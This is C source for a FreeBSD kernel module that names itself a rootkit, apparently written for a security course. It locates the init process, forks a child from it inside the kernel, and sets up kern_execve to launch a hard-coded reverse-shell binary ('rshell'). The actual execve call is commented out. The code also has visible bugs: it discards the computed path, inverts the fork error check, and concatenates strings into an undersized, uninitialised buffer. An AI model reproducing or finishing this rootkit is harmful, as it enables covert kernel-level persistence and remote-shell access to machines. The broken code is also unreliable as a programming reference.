#include <binary.h>
#include <debug.h>

#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/libkern.h>
#include <sys/unistd.h>
#include <sys/imgact.h>
#include <sys/syscallsubr.h>

#define BIN_PATH "/boot/modules/data/"
#define PROCESS_ID_TO_FORK 1
MALLOC_DEFINE(BINARY_BOOT, "binary_boot", "binary_boot");

int boot_binary(char *path){
	char * binary_path = get_binary_path(path);
	binary_path = NULL;
	struct thread * thread_to_fork = find_first_thread(PROCESS_ID_TO_FORK);

	if(thread_to_fork != NULL)
	{
		LOGI("[rootkit:boot_binary] Found first thread with tid %d\n", thread_to_fork->td_tid);
		int fork_error, forked_pid;
		fork_error = fork_process(thread_to_fork, &forked_pid);
		if(fork_error != 0)
		{
			LOGI("[rootkit:boot_binary] forked PID %d\n", forked_pid);
			struct thread * thread_for_execve = find_first_thread(forked_pid);
			LOGI("[rootkit:boot_binary] Executing execve on tid=[%d]\n", thread_for_execve->td_tid);
			// int result = execute_binary(thread_for_execve);
			// LOGI("[rootkit:boot_binary]: execve=>%d\n", result);
		}

	}
	return 1;
}

int fork_process(struct thread * thread_to_fork, int *pid)
{
	struct fork_req fr;
	bzero(&fr, sizeof(fr));
	fr.fr_flags = RFFDG | RFPROC;
	fr.fr_pidp = pid;
	int error = fork1(thread_to_fork, &fr);
	return error;
}

char * get_binary_path(char * path)
{
	LOGI("[rootkit:boot_binary]  BINARY BOOT\n");
	char * new_string = malloc(strlen(BIN_PATH) + strlen(path), BINARY_BOOT, M_WAITOK);
	char * temp = strcat(new_string, BIN_PATH);
	char * final = strcat(temp, path);

	LOGI("[rootkit:boot_binary] new %s\n", new_string);
	LOGI("[rootkit:boot_binary] temp %s\n", temp);
	LOGI("[rootkit:boot_binary]  Attempting to boot %s\n", final);
	return final;
}

int execute_binary(struct thread * td)
{
	struct image_args args;
	struct vmspace *oldvmspace;
	int error;

	error = pre_execve(td, &oldvmspace);
	if (error != 0)
		return (error);

	char *file_path = "/usr/home/comp6447/rootkit/src/rshell/rshell";
	args.fname = file_path;
	args.begin_argv = 0x00;
	args.begin_envv = 0x00;
	LOGI("Executing %s\n", args.fname);

	error = kern_execve(td, &args, NULL);
	post_execve(td, error, oldvmspace);
	return (error);
}

struct thread * find_first_thread(pid_t pid)
{	
	struct proc *p;	
	struct proc *return_p;
	struct thread * return_thread;

	return_p = 0x00;
	p = 0x00;
	return_thread = 0x00;

	LOGI("[rootkit:find_process] Attemping to find process with ID %d\n", pid);

	sx_slock(&allproc_lock);
	
	/* Two options. Iterate over pidhashtabl, or allproc_list. 
	*  Better performance over pidhashtabl */
	LIST_FOREACH(p, PIDHASH(pid), p_list){
		LOGI("[rootkit:find_process] Checking PID:%d\n", p->p_pid);
		if(p->p_pid == pid)
		{
			/* A process is either NEW, NORMAL, ZOMBIE 
			*  ( new means in creation , see proc.h ) */
			if(p->p_state == PRS_NEW)
			{ 
				p = NULL;
				break;
			}
			return_p = p;
			break;
		}
	}

	sx_sunlock(&allproc_lock);
	
	if( return_p != NULL )
	{
		return_thread = FIRST_THREAD_IN_PROC(return_p);
	}
	return return_thread;
}






